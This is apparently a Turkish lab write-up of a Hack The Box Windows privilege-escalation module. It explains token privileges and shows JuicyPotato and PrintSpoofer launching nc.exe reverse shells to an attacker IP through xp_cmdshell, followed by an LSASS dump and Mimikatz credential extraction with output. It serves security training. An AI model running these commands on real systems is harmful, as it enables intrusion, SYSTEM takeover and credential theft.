- **SeDebugPrivilege ([Programları Hata Ayıklama](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs))**
    
    - **Standard Assignment:** Administrators
    - **Description:** Bu ayar, hangi kullanıcıların sahip olmadıkları bir process de dahil olmak üzere herhangi bir process'e bağlanıp açabileceğini belirler. Yeni sistem bileşenlerini hata ayıklayan geliştiriciler bu kullanıcı hakkına ihtiyaç duyar. Bu hak, hassas ve kritik işletim sistemi bileşenlerine erişim sağlar.

- **SeImpersonatePrivilege ([Kimlik Doğrulama Sonrası Bir İstemciyi Taklit Etme](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication))**
    
    - **Standard Assignment:** Administrators, Local Service, Network Service, Service
    - **Description:** Bu ayar, hangi programların bir kullanıcıyı veya başka bir belirli hesabı taklit etmesine ve kullanıcı adına hareket etmesine izin verildiğini belirler.

- **SeLoadDriverPrivilege ([Sürücü Yükleme ve Boşaltma](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers))**
    
    - **Standard Assignment:** Administrators
    - **Description:** Bu ayar, hangi kullanıcıların cihaz üzerinde dinamik olarak sürücü yükleyip boşaltabileceğini belirler. Yeni donanım için imzalı bir sürücü driver.cab dosyasında mevcutsa, bu hak gerekli değildir. Sürücülerin yüksek ayrıcalıklı kod olarak çalışması sağlanır.

- **SeRestorePrivilege ([Dosya ve Dizinleri Geri Yükleme](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories))**
    
    - **Standard Assignment:** Administrators
    - **Description:** Bu güvenlik ayarı, hangi kullanıcıların dosya, dizin, kayıt defteri ve diğer kalıcı nesne izinlerini atlayabileceğini belirler.
    

Daha fazla bilgiye [buradan](https://4sysops.com/archives/user-rights-assignment-in-windows-server-2016/) ulaşabilirsiniz.

`whoami /priv` komutunu yazdığınızda, mevcut kullanıcınıza atanan tüm kullanıcı haklarının bir listesini alırsınız. Bazı haklar yalnızca yönetici kullanıcılar tarafından kullanılabilir ve yalnızca yükseltilmiş bir cmd veya PowerShell oturumu çalıştırıldığında listelenebilir/alınabilir. Bu yükseltilmiş haklar ve [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)kavramları, uygulamaların gerekmedikçe tam izinlerle çalışmasını kısıtlamak için varsayılan olarak Windows Vista ile sunulan güvenlik özellikleridir. Yükseltilmemiş bir konsolda ve yükseltilmiş bir konsolda yönetici olarak kullanabileceğimiz hakları karşılaştırırsak, bunların büyük ölçüde farklı olduğunu görürüz.

Aşağıda bir Windows sistemindeki local administrator hesabının sahip olduğu haklar verilmiştir.


#### **Local Admin Kullanıcı Hakları - Yükseltilmiş**  

Yükseltilmiş bir komut penceresi çalıştırırsak, kullanabileceğimiz hakların tam listesini görebiliriz:

```powershell-session
PS C:\htb> whoami 

winlpe-srv01\administrator


PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled 
```

Hesabımız için bir ayrıcalık `Disabled (Devre Dışı` ) durumunda listelendiğinde, bu, hesabımıza belirli bir ayrıcalık atandığı anlamına gelir. Yine de, etkinleştirilene kadar ilişkili eylemleri gerçekleştirmek için bir access token'da kullanılamaz. Windows, ayrıcalıkları etkinleştirmek için yerleşik bir komut veya PowerShell cmdlet'i sağlamaz, bu nedenle bize yardımcı olacak bazı komut dosyalarına ihtiyacımız var. Bu modül boyunca çeşitli ayrıcalıkları kötüye kullanmanın yollarını ve mevcut prosesimiz içinde belirli ayrıcalıkları etkinleştirmenin çeşitli yollarını göreceğiz. Belirli ayrıcalıkları etkinleştirmek için kullanılabilecek bu PowerShell [script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1)'i veya token ayrıcalıklarını ayarlamak için kullanılabilecek bu [script'i](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) buna bir örnektir.

Buna karşın, standart bir kullanıcı çok daha az hakka sahiptir.


#### **Standart Kullanıcı Hakları**

```powershell-session
PS C:\htb> whoami 

winlpe-srv01\htb-student


PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Kullanıcı hakları, yerleştirildikleri gruplara veya atanan ayrıcalıklara bağlı olarak artar. Aşağıda, `Backup Operators` grubundaki kullanıcılara verilen hakların bir örneği bulunmaktadır. Bu gruptaki kullanıcılar UAC'nin şu anda kısıtladığı başka haklara da sahiptir. Yine de, bu komuttan [SeShutdownPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/shut-down-the-system)'a sahip olduklarını görebiliriz, bu da bir domain controller'da yerel olarak oturum açmaları durumunda (RDP veya WinRM aracılığıyla değil) büyük bir hizmet kesintisine neden olabilecek bir domain controller'ı kapatabilecekleri anlamına gelir.

#### **Backup Operators Hakları**

```powershell-session
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```


### Algılama

Windows ayrıcalıkları hakkında daha fazla bilgi edinmek ve suistimali tespit edip önlemek için bu [yazı](https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e) okunmaya değer, özellikle de yeni bir oturum açma işlemine belirli hassas ayrıcalıklar atandığında bir olay oluşturacak olan [**4672: Yeni oturuma özel ayrıcalıklar atandı**](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672) olayını kaydederek. Bu olay kaydı, hiçbir zaman atanması gereken veya yalnızca belirli hesaplara atanması gereken ayrıcalıkları izleyerek birçok şekilde hassaslaştırılabilir.


## **Devam Ediyoruz**  

Saldırganlar ve savunmacılar olarak bu grupların üyeliklerini gözden geçirmemiz gerekir. Bu gruplardan birine ya da daha fazlasına eklenmiş, tek bir hostun güvenliğini tehlikeye atmak ya da Active Directory ortamında daha fazla erişim sağlamak için kullanılabilecek, düşük ayrıcalıklı görünen kullanıcılar bulmak nadir değildir. En yaygın haklardan bazılarının etkilerini tartışacağız ve hesabına bu haklardan bazıları atanmış bir kullanıcıya erişim elde edersek ayrıcalıkları nasıl yükselteceğimize dair alıştırmalar yapacağız.


# **SeImpersonate ve SeAssignPrimaryToken**

Windows'ta her process, onu çalıştıran hesap hakkında bilgi içeren bir token'a sahiptir. Bu tokenlar güvenli kaynaklar olarak kabul edilmez, çünkü bunlar bellek içinde bellek okuyamayan kullanıcılar tarafından brute-forced yapılabilecek konumlardır. Token'ı kullanmak için `SeImpersonate` ayrıcalığı gereklidir. Bu ayrıcalık yalnızca admin hesaplarına verilir ve çoğu durumda sistem hardening sırasında kaldırılabilir. Bu token'ın kullanımına örnek olarak [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) verilebilir.

Normal programlar, Administrator'dan ek ayrıcalıklara sahip olan Local System'e yükselmek için başka bir process'in token'ını kullanabilir. Prosesler bunu genellikle bir SYSTEM token'ı almak için WinLogon prosesine bir çağrı yaparak ve ardından kendisini SYSTEM alanına yerleştiren bu token ile çalıştırarak yapar. Saldırganlar genellikle bu ayrıcalığı, bir servis hesabının `SeImpersonate` yapabildiği ancak tam SYSTEM seviyesi ayrıcalıkları elde edemediği " Potato tarzı" ayrıcalıklarda kötüye kullanırlar. Esasen, Potato saldırısı SYSTEM olarak çalışan bir process'i kendi process'ine bağlanması için kandırır ve bu process de kullanılacak token'ı teslim eder.

Bu ayrıcalıkla genellikle bir servis hesabı bağlamında çalışan bir uygulama aracılığıyla uzaktan kod yürütme elde ettikten sonra karşılaşırız (örneğin, bir ASP.NET web uygulamasına bir web shell yükleyerek, bir Jenkins yüklemesi aracılığıyla uzaktan kod yürütme elde ederek veya MSSQL sorguları aracılığıyla komutlar yürüterek). Bu şekilde erişim elde ettiğimizde, bu ayrıcalığın varlığı genellikle yükseltilmiş ayrıcalıklara hızlı ve kolay bir yol sunduğundan hemen kontrol etmeliyiz. Token kimliğine bürünme saldırıları hakkında daha fazla ayrıntı için bu [makale](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) okunmaya değer.


## **SeImpersonate Örnek - JuicyPotato**

Ayrıcalıklı bir SQL kullanıcısı kullanarak bir SQL sunucusunda yer edindiğimiz aşağıdaki örneği ele alalım. IIS ve SQL Server'a client bağlantıları Windows Authentication kullanacak şekilde yapılandırılmış olabilir. Sunucunun daha sonra bağlanan istemci olarak dosya paylaşımları gibi diğer kaynaklara erişmesi gerekebilir. Bu, istemci bağlantısının kurulduğu kullanıcının kimliğine bürünerek yapılabilir. Bunu yapmak için, servis hesabına [Kimlik doğrulamasından sonra bir istemcinin kimliğine bürünme](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication) ayrıcalığı verilecektir.

Bu senaryoda, SQL Service hizmet hesabı varsayılan `mssqlserver` hesabı bağlamında çalışmaktadır. `Snaffler` aracını kullanarak bir dosya paylaşımındaki `logins.sql` dosyasında elde edilen bir dizi kimlik bilgisini kullanarak `xp_cmdshell` kullanarak bu kullanıcı olarak komut yürütmeyi başardığımızı düşünün.


#### **MSSQLClient.py ile bağlanma**

`sql_dev:Str0ng_P@ssw0rd!` kimlik bilgilerini kullanarak önce SQL sunucu örneğine bağlanalım ve ayrıcalıklarımızı onaylayalım `.` Bunu `Impacket` araç setindeki [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) dosyasını kullanarak yapabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL>
```

#### **xp_cmdshell'i Etkinleştirme**

Daha sonra, işletim sistemi komutlarını çalıştırmak için `xp_cmdshell` stored procedure'ünü etkinleştirmeliyiz. Bunu Impacket MSSSQL shell üzerinden `enable_xp_cmdshell` yazarak yapabiliriz. `help` yazıldığında diğer birkaç komut seçeneği görüntülenir

```shell-session
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```

Not: Impacket bunu bizim için yaptığı için aslında `RECONFIGURE` yazmamıza gerek yoktur.

#### **Erişimin Onaylanması**  

Bu erişimle, gerçekten de bir SQL Server hizmet hesabı bağlamında çalıştığımızı doğrulayabiliriz.

```shell-session
SQL> xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01
```

#### **Checking Account Privileges**

Ardından, hizmet hesabına hangi ayrıcalıkların verildiğini kontrol edelim.

```shell-session
SQL> xp_cmdshell whoami /priv

output                                                                             

--------------------------------------------------------------------------------   
                                                                    
PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
```

`whoami /priv` komutu [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) 'ın listelendiğini doğrular. Bu ayrıcalık `NT AUTHORITY\SYSTEM` gibi ayrıcalıklı bir hesabı taklit etmek için kullanılabilir. [JuicyPotato](https://github.com/ohpe/juicy-potato)DCOM/NTLM yansımasının kötüye kullanılması yoluyla `SeImpersonate` veya `SeAssignPrimaryToken` ayrıcalıklarından yararlanmak için kullanılabilir.


#### **JuicyPotato Kullanarak Ayrıcalıkları Yükseltme**

Bu hakları kullanarak ayrıcalıkları yükseltmek için, önce `JuicyPotato.exe` binary dosyasını indirelim ve bunu ve `nc.` `exe` dosyasını hedef sunucuya yükleyelim. Ardından, 8443 numaralı portta bir Netcat dinleyicisi kurun ve aşağıdaki komutu çalıştırın; burada `-l` COM sunucu dinleme portu, `-p` başlatılacak program (cmd.exe), `-a` cmd.exe'ye aktarılan argüman ve `-t` `createprocess` çağrısıdır. Aşağıda, araca sırasıyla `SeImpersonate` veya `SeAssignPrimaryToken` ayrıcalıklarına ihtiyaç duyan [`CreateProcessWithTokenW`](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) ve [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera)fonksiyonlarını denemesini söylüyoruz.

```shell-session
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------------   

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
                                                                            
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08
```

1. **`xp_cmdshell`**:
    
    - `xp_cmdshell` SQL Server'da bulunan ve SQL üzerinden dış komutları çalıştırmaya izin veren bir genişletilmiş saklı prosedürdür.
    - Bu örnekte, SQL Server üzerinden `JuicyPotato.exe` aracı çağrılıyor.
2. **`c:\tools\JuicyPotato.exe`**:
    
    - Bu kısım, `JuicyPotato.exe` adlı bir araçtır. `JuicyPotato`, Windows sistemlerindeki bazı hizmetlerin yetkilendirme boşluklarından yararlanarak **yetki yükseltme** (privilege escalation) saldırıları için kullanılır.
    - Araç, sistemde belirli ayrıcalıklara sahip olmayan kullanıcıların bu açıklar üzerinden SYSTEM ayrıcalıklarını almasını sağlar.
3. **`-l 53375`**:
    
    - `-l` (dinleme portu - listen port) parametresi, `JuicyPotato.exe` aracının yerel bir bağlantı noktası açmasını ve bu bağlantı noktasını dinlemesini sağlar.
    - `53375` burada seçilen bağlantı noktasıdır. Bu bağlantı noktası, `JuicyPotato` aracının bağlantı kurduğu ve SYSTEM yetkisi elde etmek için kullanacağı yerel porttur.
4. **`-p c:\windows\system32\cmd.exe`**:
    
    - `-p` (program yolu - program path) parametresi, `JuicyPotato` aracının hangi programı çalıştıracağını belirler.
    - `c:\windows\system32\cmd.exe`, burada çalıştırılacak olan programdır, yani `cmd.exe` (Windows komut istemi).
    - `JuicyPotato`, SYSTEM ayrıcalıklarını elde ettikten sonra `cmd.exe`'yi çalıştırarak kullanıcının komut satırına SYSTEM yetkileriyle erişmesini sağlar.
5. **`-a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe"`**:
    
    - `-a` (argümanlar - arguments) parametresi, `JuicyPotato` aracının çalıştıracağı programa iletilecek argümanları belirler.
    - `"/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe"` ifadesi, `cmd.exe` programına iletilen argümandır.
    - **`/c`**: `cmd.exe`'ye `-c` parametresi verildiğinde, ardından gelen komutu çalıştırır ve sonra kapanır.
    - **`c:\tools\nc.exe`**: Bu, `nc.exe` adlı bir programı çalıştırır. `nc.exe`, **Netcat** adlı bir ağ aracıdır ve genellikle ters bağlantılar (reverse shell) kurmak için kullanılır.
    - **`10.10.14.3 8443`**: Bu, Netcat'in bağlanacağı uzak IP adresi ve portudur.
        - `10.10.14.3` burada saldırganın IP adresidir.
        - `8443`, saldırganın dinlediği bağlantı noktasını belirtir.
    - **`-e cmd.exe`**: `-e` parametresi, `Netcat`'in `cmd.exe` uygulamasını bağlanan kullanıcıya yönlendirmesini sağlar. Bu sayede, saldırgan 10.10.14.3:8443 adresinde bir bağlantıyı dinlediğinde, ters bağlantı üzerinden komut istemine erişir.
6. **`-t *`**:
    
    - `-t` parametresi, `JuicyPotato` aracının COM türünü (COM type) belirlemek için kullanılır.
    - `*` sembolü, tüm COM türlerini denemesini sağlar. Bu, `JuicyPotato`'nun hedef makinede SYSTEM yetkilerini elde etmek için uygun olan türü otomatik olarak bulmasını sağlar.
    - Bazı sistemlerde belirli COM türleri belirli ayrıcalıklar sunar, bu nedenle bu seçenek `JuicyPotato` aracının farklı türleri denemesine olanak tanır.

### Komutun Genel Amacı

Bu komut, SQL Server üzerinden `JuicyPotato.exe` aracını çalıştırarak SYSTEM yetkileriyle bir `cmd.exe` komut istemi açmayı ve ardından `Netcat` ile bir ters bağlantı oluşturmayı amaçlamaktadır. Böylece, saldırgan 10.10.14.3 IP'sinde 8443 portundan bağlantı aldığında hedef sistem üzerinde SYSTEM ayrıcalıklarıyla çalışan bir komut istemine erişir. Bu yöntem, saldırganın hedef sistemde yüksek yetkili komutlar çalıştırabilmesini sağlar.


#### **Catching SYSTEM Shell**  

Bu işlem başarıyla tamamlanır ve `NT AUTHORITY\SYSTEM` olarak bir shell alınır.

```shell-session
M1R4CKCK@htb[/htb]$ sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system


C:\Windows\system32>hostname

hostname
WINLPE-SRV01
```


## **PrintSpoofer ve RoguePotato**

JuicyPotato, Windows Server 2019 ve Windows 10 build 1809 üzerinde çalışmaz. Ancak, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) ve [RoguePotato](https://github.com/antonioCoco/RoguePotato) aynı ayrıcalıklardan yararlanmak ve `NT AUTHORITY\SYSTEM` düzeyinde erişim elde etmek için kullanılabilir. Bu [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/), JuicyPotato'nun artık çalışmadığı Windows 10 ve Server 2019 hostlarında kimliğe bürünme ayrıcalıklarını kötüye kullanmak için kullanılabilecek `PrintSpoofer` aracını derinlemesine incelemektedir.

#### **PrintSpoofer Kullanarak Ayrıcalıkları Yükseltme**  

`PrintSpoofer` aracını kullanarak bunu deneyelim. Aracı, mevcut konsolunuzda bir SYSTEM process'i oluşturmak ve onunla etkileşime geçmek, bir masaüstünde bir SYSTEM process'i oluşturmak ( local olarak veya RDP aracılığıyla oturum açtıysanız) veya bir reverse shell yakalamak için kullanabiliriz - ki biz de örneğimizde bunu yapacağız. Yine, `mssqlclient.py` ile bağlanın ve bir komut çalıştırmak için aracı `-c` bağımsız değişkeniyle kullanın. Burada, bir reverse shell oluşturmak için `nc.exe` kullanıyoruz (8443 numaralı portta saldırı kutumuzda bekleyen bir Netcat dinleyicisi ile).

```shell-session
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL 
```


#### **Reverse Shell'in SYSTEM olarak yakalanması**  

Her şey plana uygun giderse, netcat dinleyicimizde bir SYSTEM shell'e sahip olacağız.

```shell-session
M1R4CKCK@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system
```


Soru : Bu bölümde gösterilen yöntemlerden birini kullanarak ayrıcalıkları yükseltin. c:\Users\Administrator\Desktop\SeImpersonate\flag.txt adresinde bulunan bayrak dosyasının içeriğini gönderin.
Cevap : 

1- 
![Pasted image 20241113024212.png](/img/user/resimler/Pasted%20image%2020241113024212.png)

2- 

![Pasted image 20241113024247.png](/img/user/resimler/Pasted%20image%2020241113024247.png)

3- 
![Pasted image 20241113024342.png](/img/user/resimler/Pasted%20image%2020241113024342.png)

4-
![Pasted image 20241113024355.png](/img/user/resimler/Pasted%20image%2020241113024355.png)

5- 
![Pasted image 20241113024516.png](/img/user/resimler/Pasted%20image%2020241113024516.png)

6-
![Pasted image 20241113024653.png](/img/user/resimler/Pasted%20image%2020241113024653.png)

7-
![Pasted image 20241113024719.png](/img/user/resimler/Pasted%20image%2020241113024719.png)

8-
![Pasted image 20241113024742.png](/img/user/resimler/Pasted%20image%2020241113024742.png)

9-
![Pasted image 20241113024816.png](/img/user/resimler/Pasted%20image%2020241113024816.png)


# SeDebugPrivilege

Belirli bir uygulama veya hizmeti çalıştırmak ya da sorun gidermeye yardımcı olmak için bir kullanıcıya, hesabı administrators grubuna eklemek yerine [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) atanabilir. Bu ayrıcalık, `Computer Settings (Bilgisayar Ayarları) > Windows Settings (Windows Ayarları) > Security Settings (Güvenlik Ayarları`) altındaki local (yerel) veya domain group policy ( domain grup ilkesi) aracılığıyla atanabilir. Varsayılan olarak, sistem belleğinden hassas bilgileri yakalamak veya kernel ve uygulama yapılarına erişmek/değiştirmek için kullanılabileceğinden, bu ayrıcalık yalnızca yöneticilere verilir. Bu hak, günlük işlerinin bir parçası olarak yeni sistem bileşenlerinde hata ayıklaması gereken geliştiricilere atanabilir. Bu kullanıcı hakkı idareli bir şekilde verilmelidir çünkü bu hakka sahip olan herhangi bir hesap kritik işletim sistemi bileşenlerine erişebilir.

Dahili bir sızma testi sırasında, hedef alınacak potansiyel kullanıcılar hakkında bilgi toplamak için LinkedIn gibi web sitelerini kullanmak genellikle yararlı olur. Örneğin `Responder` veya `Inveigh` kullanarak çok sayıda NTLMv2 parola hash'i elde ettiğimizi varsayalım. Bu durumda, parola hash'i kırma çabalarımızı, hesaplarına bu tür ayrıcalıklar atanmış olma olasılığı daha yüksek olan geliştiriciler gibi olası yüksek değerli hesaplara odaklamak isteyebiliriz. Bir kullanıcı bir hostta local admin olmayabilir ancak BloodHound gibi bir araç kullanarak uzaktan listeleyemeyeceğimiz haklara sahip olabilir. Bu, birkaç kullanıcı için kimlik bilgileri aldığımız ve bir veya daha fazla host'a RDP erişimine sahip olduğumuz ancak ek ayrıcalıklara sahip olmadığımız bir ortamda kontrol etmeye değer olacaktır.

![Pasted image 20241113145341.png](/img/user/resimler/Pasted%20image%2020241113145341.png)

`Debug programs` hakkı atanmış bir kullanıcı olarak oturum açtıktan ve yükseltilmiş bir shell açtıktan sonra `SeDebugPrivilege` 'ın listelendiğini görüyoruz.

![Pasted image 20241113145422.png](/img/user/resimler/Pasted%20image%2020241113145422.png)

Bu ayrıcalıktan yararlanmak ve process belleğinin dump'ını almak için [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)paketindeki [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)'ı kullanabiliriz. İyi bir aday, bir kullanıcı sistemde oturum açtıktan sonra kullanıcı kimlik bilgilerini depolayan Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) prosesidir.

```cmd-session
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

- **`procdump.exe`**: Microsoft'un Sysinternals araçlarından biri olan `procdump`, belirli bir process'in memory dump'ını almak için kullanılır. Bu komutta hedef olarak `lsass.exe` process'i seçilmiştir.
    
- **`-accepteula`**: Procdump ilk çalıştırıldığında End User License Agreement (EULA) görüntüler. Bu parametre, EULA'yı otomatik olarak kabul eder ve komutun herhangi bir kullanıcı onayı olmadan çalışmasını sağlar. Özellikle otomasyon veya script yazımında faydalıdır.
    
- **`-ma`**: Full memory dump almak için kullanılan parametredir. Bu seçenek, yalnızca basic memory information değil, aynı zamanda stack, memory-mapped files ve tüm process memory içeriğini de içeren tam bir dump oluşturur. LSASS gibi hassas veriler içeren bir process'te çalışırken genellikle `-ma` parametresi kullanılır.
    
- **`lsass.exe`**: Process adı olarak burada **Local Security Authority Subsystem Service** (LSASS) process'i hedefleniyor. LSASS, Windows'ta authentication ve security-related işlemleri yürütür ve bu nedenle security research veya pentest çalışmalarında sıklıkla hedef alınır.
    
- **`lsass.dmp`**: Oluşturulan dump dosyasının adıdır. Bu komut çalıştırıldığında, LSASS process'inin full memory dump'ı `lsass.dmp` dosyasına kaydedilir. Bu dump dosyası, forensic analysis veya diğer analysis araçlarıyla daha sonra incelenebilir.

Bu başarılıdır ve `sekurlsa::minidump` komutunu kullanarak bunu `Mimikatz` 'a yükleyebiliriz. `sekurlsa::logonPasswords` komutlarını verdikten sonra, local olarak oturum açmış local administrator hesabının NTLM hash'ini elde ederiz. Bunu, aynı local administrator parolası bir veya birden fazla ek sistemde kullanılıyorsa (büyük kuruluşlarda yaygındır) yanlara doğru hareket etmek için bir pass-the-hash saldırısı gerçekleştirmek için kullanabiliriz.  

Not: “Mimikatz ‘da herhangi bir komut çalıştırmadan önce ’log” yazmak her zaman iyi bir fikirdir, bu şekilde tüm komut çıktıları bir “.txt” dosyasına aktarılır. Bu, özellikle bellekte çok sayıda kimlik bilgisi kümesine sahip olabilecek bir sunucudan kimlik bilgilerini dökerken kullanışlıdır.

```cmd-session
C:\htb> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

<SNIP> 

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
